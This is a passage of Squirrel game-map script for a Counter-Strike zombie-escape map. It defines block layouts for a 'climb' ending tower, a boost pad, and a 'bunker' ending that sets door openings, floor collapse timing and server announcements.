								{x = 17.6,		y = -3.3,		z = 38.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.5,		y = 3.3,		z = 40.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.5,		y = -3.3,		z = 40.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.3,		y = 1.8,		z = 42.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.3,		y = -1.8,		z = 42.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.3,		y = 0.0,		z = 44.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 20.5,		y = 0.8,		z = 62.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 20.5,		y = -0.8,		z = 62.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 20.5,		y = 2.0,		z = 64.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 20.5,		y = -2.0,		z = 64.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 18.5,		y = 2.0,		z = 66.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 18.5,		y = -2.0,		z = 66.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 16.5,		y = 2.0,		z = 68.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 16.5,		y = -2.0,		z = 68.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									{x = 16.10,		y = 0.0,		z = 70.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 15.10,		y = 0.0,		z = 70.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},	//v1_6 rework:
								{x = 15.00,		y = 0.0,		z = 72.00,			yaw = 45,		index = 25,		targetname="ending_climb_block"},
								{x = 14.75,		y = 0.005,		z = 69.05,			yaw = null,		index = 91,		targetname="ending_climb_block"},
								{x = 16.00,		y = 2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 17.00,		y = 2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 18.00,		y = 2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 19.00,		y = 2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 20.00,		y = 2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 16.00,		y = -2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 17.00,		y = -2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 18.00,		y = -2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 19.00,		y = -2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
								{x = 20.00,		y = -2.5,		z = 75.00,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 19.5,		y = 0.8,		z = 92.50,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 19.5,		y = -0.8,		z = 92.50,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.8,		y = 1.0,		z = 94.60,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.8,		y = -1.0,		z = 94.60,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.7,		y = 0.8,		z = 96.70,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.7,		y = -0.8,		z = 96.70,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.10,		y = 0.0,		z = 98.80,			yaw = null,		index = 25,		targetname="ending_climb_block"},
										{x = 17.80,		y = 0.0,		z = 100.90,			yaw = 45,		index = 25,		targetname="ending_climb_block"},
										{x = 17.90,		y = 0.0,		z = 103.00,			yaw = -45,		index = 25,		targetname="ending_climb_block"},
											{x = 18.10,		y = 0.4,		z = 107.10,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.90,		y = -0.4,		z = 107.10,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.20,		y = -0.3,		z = 109.20,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.80,		y = 0.3,		z = 109.20,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.30,		y = 0.2,		z = 111.30,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.70,		y = -0.2,		z = 111.30,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.40,		y = -0.1,		z = 113.40,			yaw = null,		index = 25,		targetname="ending_climb_block"},
											{x = 18.60,		y = 0.1,		z = 113.40,			yaw = null,		index = 25,		targetname="ending_climb_block"},
									//top/safe block(s):
								{x = 18.5,			y = 0.00,		z = 135.00,			yaw = null,			index = 5,			targetname="ending_safeblock_climb"},
									{x = 19.25,			y = 0.75,		z = 129.90,			yaw = null,			index = 91,			targetname="ending_safeblock_climb_break"},//v1_6 rework:
									{x = 19.25,			y = -0.75,		z = 129.90,			yaw = null,			index = 91,			targetname="ending_safeblock_climb_break"},
									{x = 17.75,			y = 0.75,		z = 129.90,			yaw = null,			index = 91,			targetname="ending_safeblock_climb_break"},
									{x = 17.75,			y = -0.75,		z = 129.90,			yaw = null,			index = 91,			targetname="ending_safeblock_climb_break"},
									//main tower pieces:
								{x = 15,			y = 0.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = 1.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = 2.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 16,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 17,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 18,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 19,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 20,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 21,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = 0.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = 1.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = 2.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = 3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = 0.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = 1.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 17,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 18,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 19,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 20,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = 0.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = 1.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = 2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 17,			y = 0.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 17,			y = 1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 18,			y = 1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 19,			y = 1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 20,			y = 0.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 20,			y = 1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
											{x = 18,			y = 0.5,		z = 105.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
											{x = 19,			y = 0.5,		z = 105.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = -0.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = -1.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = -2.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 15,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 16,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 17,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 18,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 19,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 20,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 21,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = -0.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = -1.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = -2.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
								{x = 22,			y = -3.5,		z = 15.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = -0.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = -1.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 16,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 17,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 18,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 19,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 20,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = -0.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = -1.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
									{x = 21,			y = -2.5,		z = 45.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 17,			y = -0.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 17,			y = -1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 18,			y = -1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 19,			y = -1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 20,			y = -0.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
										{x = 20,			y = -1.5,		z = 75.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
											{x = 18,			y = -0.5,		z = 105.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
											{x = 19,			y = -0.5,		z = 105.00,			yaw = null,			index = 5,			targetname="ending_climb_towerblock"},
						];
							//start floors:
						for(local y = -2; y < 3; y++){spawnlist.push({x = 0.00,	y = y,		z = 0.00,	yaw = null,		index = 5,		targetname="ending_climb_startblock"});}
							//start boostpad:
						local boostmodel = ::TILEVARIANTS[::TYPES[126].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[126].name][::THEME].main.len()-1)];
						local boostpos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
								(md.direction_next*(1.00*man.GRID_SIZE))+
								(direction_next_left*(0.00*man.GRID_SIZE))+
								Vector(0,0,0.00*man.ELEVATION);
						//::manager.PrecacheModel(boostmodel);
						::Ent(boostpos,::DirToAngles(md.direction_next),"prop_dynamic",{
								targetname = "ending_startboost_climb",
								model = boostmodel,
								rendermode = 1,
								rendercolor = "255 0 0 50",
								renderamt = 50,
							},{
							function Run(){
								EntFireByHandle(self,"AddOutput","body 1",0.00,null,null);
								EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 255",::ENDINGS.CLIMB.boost_enable_delay,null,null);
								EntFireByHandle(self,"AddOutput","renderamt 255",::ENDINGS.CLIMB.boost_enable_delay,null,null);
								::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
										spawnflags = 1,
										targetname = "ending_startboost_climb_trigger",
									},{function TouchPost(){
										activator.SetVelocity((self.GetForwardVector()*750)+Vector(0,0,1000));
									},function Touch(){
										local toucher = activator;	//__CSS__ activator may get reset, store toucher
										toucher.SetVelocity(Vector());
										toucher.SetOrigin(self.GetOrigin()+Vector(0,0,25));
										EntFireByHandle(self,"RunScriptCode","TouchPost();",0.08,toucher,null);
										if(::BOOSTPAD_SOUND!=null)::Sound(::BOOSTPAD_SOUND,Vector(),toucher,-1,0.20,100,10);
									},function Run(){
										EntFireByHandle(self,"AddOutput","mins -25 -25 -5",0.00,null,null);
										EntFireByHandle(self,"AddOutput","maxs 25 25 40",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"Enable","",::ENDINGS.CLIMB.boost_enable_delay,null,null);
											//EntFireByHandle(self,"RunScriptCode",
											//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
											//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
									}});
							}});
								//bottom layers:
						local bottomlayers_z = 15;
						for(local i=0;i<::ENDINGS.CLIMB.tower_extra_bottomlayers;i++)
						{
							bottomlayers_z -= 31;
							spawnlist.push({x = 15,		y = 0.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = 1.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = 2.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 16,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 17,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 18,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 19,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 20,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 21,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = 0.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = 1.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = 2.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = 3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = -0.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = -1.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = -2.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 15,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 16,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 17,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 18,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 19,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 20,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 21,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = -0.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = -1.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = -2.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
							spawnlist.push({x = 22,		y = -3.5,		z = 0+bottomlayers_z,		yaw = null,		index = 5,	targetname="ending_climb_towerblock"});
						}
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
								(md.direction_next*(s.x*man.GRID_SIZE))+
								(direction_next_left*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.z*man.ELEVATION);
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model};
							if("targetname" in s)sq.targetname <- s.targetname;
							else sq.targetname <- "climb_ending_block";
							if(s.index==3)//LADDER
							{
								::ladder_spawnqueue.push({targetname=s.targetname});
								::ladderspawnqueuespawn.push({pos=spawndata.pos,rot=Vector(0,spawndata.yaw+180,0)});
							}
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(spawndata);
						}
					}},
				BUNKER={	cancel_mapspawn=true,		movetp_clean=true,
					//ratio_crouch:		the human-vs-zombie ratio required to open the door in a crouch-state
					//ratio_full: 		the human-vs-zombie ratio required to open the door in a fully-open-state
					//if the current-ratio is HIGHER than the target-ratio, it SUCCEEDS/OPENS
					//it checks 'full' first, if it doesn't succeed, it checks 'crouch', if it doesn't succeed it stays closed
					//this should make it possible to defend more easily with less humans alive towards the end
					//higher ratio = easier for humans
					//		ratio calculation:
					//			--->	(HUMAN_COUNT / ZOMBIE_COUNT) = RATIO
					//		ratio examples:
					//			--->	50 humans + 14 zombies		=	3.57 ratio
					//			--->	40 humans + 24 zombies		=	1.66 ratio
					//			--->	30 humans + 34 zombies		=	0.88 ratio
					//			--->	20 humans + 44 zombies		=	0.45 ratio
					//			--->	10 humans + 54 zombies		=	0.18 ratio
					//			--->	5 humans + 59 zombies		=	0.08 ratio
					//			--->	5 humans + 59 zombies		=	0.08 ratio
						tp_delay = 60.00,			//how long to wait until clearing previous stage + enabling TP in front of bunker
						defend_time = 90.00,		//how long to defend until the outer/non-bunker tiles start collapsing
						collapse_rate = 0.15,		//how fast the collapse-sequence should tick
						timeout_slay_all = 40.00,	//once the stage is 100% collapsed (except bunker), wait for this time before slaying ALL (lose)
						z_inside_hpcap = 1000,		//if a zombie gets inside, cap it to this HP, making it easier to kill/salvage the situation
						openings = [//runs in order, from top to bottom (actual door position it picks is scrambled/random), delays are relative to eachother
								{	delay = 1.00,		ratio_crouch = -100.00,		ratio_full = 1.25	},
								{	delay = 10.00,		ratio_crouch = 0.20,		ratio_full = 1.50	},
								{	delay = 10.00,		ratio_crouch = 0.40,		ratio_full = 1.75	},
								{	delay = 10.00,		ratio_crouch = 0.60,		ratio_full = 2.00	},
								{	delay = 10.00,		ratio_crouch = 0.80,		ratio_full = 2.25	},
								{	delay = 10.00,		ratio_crouch = 1.00,		ratio_full = 2.50	},
								{	delay = 10.00,		ratio_crouch = 1.20,		ratio_full = 2.75	},
								{	delay = 10.00,		ratio_crouch = 1.40,		ratio_full = 3.00	},
							],
					non_bunker_tiles = [],
					function TickDoorOpen(){
						local doorlist = [];
						for(local h;h=Entities.FindByName(h,"bunker_door");)
						{
							if(h==null||!h.IsValid())continue;
							doorlist.push(h);
						}
						if(doorlist.len()<=0)return;
						local door = doorlist[RandomInt(0,doorlist.len()-1)];
						door.__KeyValueFromString("targetname","bunker_door_processed");
						local count_ct = 0;
						local count_t = 0;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid())continue;
							if(h.GetTeam()==3)count_ct++;
							else count_t++;
						}
						if(count_ct>0 && count_t>0)
						{
							local ratind = "(H:"+(0.00+(count_ct)).tostring()+"/Z:"+(0.00+(count_t)).tostring()+" = RATIO:"+((0.00+(count_ct))/(0.00+(count_t))).tostring()+")";
							local ratio = (0.00+((0.00+count_ct) / (0.00+count_t)));
							if(ratio > openings[0].ratio_full)
							{
								EntFireByHandle(door,"SetPosition","2.60",0.00,null,null);
								ratind = ratind+" (target_full:"+openings[0].ratio_full.tostring()+")";
								::ServerSay("say [BUNKER ENDING] OPENING EXTRA DOOR (FULLY)___________"+ratind,0.00,null);
							}
							else if(ratio > openings[0].ratio_crouch)
							{
								EntFireByHandle(door,"SetPosition","1.00",0.00,null,null);
								ratind = ratind+" (target_crouch:"+openings[0].ratio_crouch.tostring()+")";
								::ServerSay("say [BUNKER ENDING] OPENING EXTRA DOOR (CROUCH)___________"+ratind,0.00,null);
							}
							else
							{
								EntFireByHandle(door,"Close","",0.00,null,null);
								ratind = ratind+" (target_crouch:"+openings[0].ratio_crouch.tostring()+")";
								::ServerSay("say [BUNKER ENDING] KEEPING EXTRA DOOR CLOSED___________"+ratind,0.00,null);
							}
						}
						else
						{
							EntFireByHandle(door,"SetPosition","2.60",0.00,null,null);
							::ServerSay("say [BUNKER ENDING] OPENING EXTRA DOOR (FULLY)___________(no opposition)",0.00,null);
						}
						openings.remove(0);
						if(openings.len()>0)
							EntFire("manager","RunScriptCode"," ::ENDINGS.BUNKER.TickDoorOpen(); ",0.02+openings[0].delay,null);
					},function TickFloorCollapse(){
						EntFire("bunker_door*","Close","",0.00,null);
						if(non_bunker_tiles.len()<=0)
						{
							::ServerSay("say [BUNKER ENDING] YOU TOOK TOO LONG TO FINISH OFF THE ZOMBIES",timeout_slay_all,null);
							EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",timeout_slay_all,null);
							return;
						}
						EntFire("manager","RunScriptCode"," ::ENDINGS.BUNKER.TickFloorCollapse(); ",collapse_rate,null);
						local t = non_bunker_tiles[0];
						non_bunker_tiles.remove(0);
						
						
						::CollapseTile(t,function(hh){
							hh.AcceptInput("DisableMotion","",null,null);
							EntFireByHandle(hh,"EnableMotion","",0.02,null,null);
							EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
							EntFireByHandle(hh,"Kill","",3.00,null,null);
						});
						//EntFireByHandle(t,"EnableMotion","",0.02,null,null);
						//EntFireByHandle(t,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						//EntFireByHandle(t,"Kill","",3.00,null,null);
						
						
					},function StartFloorCollapse(){
						EntFire("ending_bunker_tpstartblocks","Kill","",1.00,null);
						EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",1.00,null);
						local scrambler = [];
						for(local h;h=Entities.FindByName(h,"block*");){scrambler.push(h);}
						while(scrambler.len()>0)
						{
							local scrambler_idx = RandomInt(0,scrambler.len()-1);
							non_bunker_tiles.push(scrambler[scrambler_idx]);
							scrambler.remove(scrambler_idx);
						}
						EntFire("manager","RunScriptCode"," ::ENDINGS.BUNKER.TickFloorCollapse(); ",0.10,null);
					}
					function Run(){
						::delay_check_enabled = false;
						EntFire("manager","RunScriptCode"," ::ENDINGS.BUNKER.TickDoorOpen(); ",0.20+openings[0].delay,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner==3)
								{
									::ServerSay("say [BUNKER ENDING] YOU WON!",0.00,null);
									printl("[BUNKER ENDING] YOU WON!");
									::RoundWon();
								}
								else
									::ServerSay("say [BUNKER ENDING] YOU LOST!",0.00,null);
							}});
						if(::ENABLE_ENDING_MUSIC){for(local i=0;i<1;i++)
							::Sound("#music/luffaren_collective/we_were_soldiers.mp3",Vector(),null,0,70.00,100,10);}
						local man = ::manager.GetScriptScope();
						local md = ::MAPDATA[man.mapspawnindex-1];
						local direction_next_left = ::AnglesToDir(::DirToAngles(md.direction_next)+Vector(0,90,0));
						local forward_yaw = ::DirToAngles(md.direction_next).y;
						local randyaw = [0,90,180,270];
						local sideofs = -4.5;
						local opening_crouch = 57;
						local opening_stand = 149;
						local tppos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
								//(md.direction_next*(1.00*man.GRID_SIZE))+
								//(direction_next_left*(0.00*man.GRID_SIZE))+
								Vector(0,0,8);
						::TPmovequeue.push(tppos);
						::TPmovequeue.push(::DirToAngles(md.direction_next));
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay,null);
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay+0.05,null);
						EntFire("manager","RunScriptCode"," ::ENDINGS.BUNKER.StartFloorCollapse(); ",defend_time,null);
						::ServerSay("say [BUNKER ENDING] THIS IS YOUR LAST STAND",0.00,null);
						::ServerSay("say [BUNKER ENDING] THIS IS YOUR LAST STAND",0.01,null);
						::ServerSay("say [BUNKER ENDING] THIS IS YOUR LAST STAND",0.02,null);
						::ServerSay("say [BUNKER ENDING] DEFEND THE BUNKER WITH YOUR LIFE",1.03,null);
						::ServerSay("say [BUNKER ENDING] DEFEND THE BUNKER WITH YOUR LIFE",1.04,null);
						::ServerSay("say [BUNKER ENDING] DEFEND THE BUNKER WITH YOUR LIFE",1.05,null);
						local ii = (0.00+defend_time-(defend_time-5.00));
						if(ii>0.00 && ii < defend_time)
						{
							::ServerSay("say [BUNKER ENDING] HOLD OUT FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.00,null);
							::ServerSay("say [BUNKER ENDING] HOLD OUT FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.01,null);
							::ServerSay("say [BUNKER ENDING] HOLD OUT FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.02,null);
						}
						ii=(0.00+defend_time-60.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 60s",ii,null);
						ii=(0.00+defend_time-30.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 30s",ii,null);
						ii=(0.00+defend_time-10.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 10s",ii,null);
						ii=(0.00+defend_time-5.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 5s",ii,null);
						ii=(0.00+defend_time-4.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 4s",ii,null);
						ii=(0.00+defend_time-3.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 3s",ii,null);
						ii=(0.00+defend_time-2.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 2s",ii,null);
						ii=(0.00+defend_time-1.00);if(ii>0.00)
							::ServerSay("say [BUNKER ENDING] THE OUTSIDE WILL CRUMBLE IN 1s",ii,null);
						::ServerSay("say [BUNKER ENDING] THE OUTSIDE IS STARTING TO CRUMBLE",defend_time,null);
						
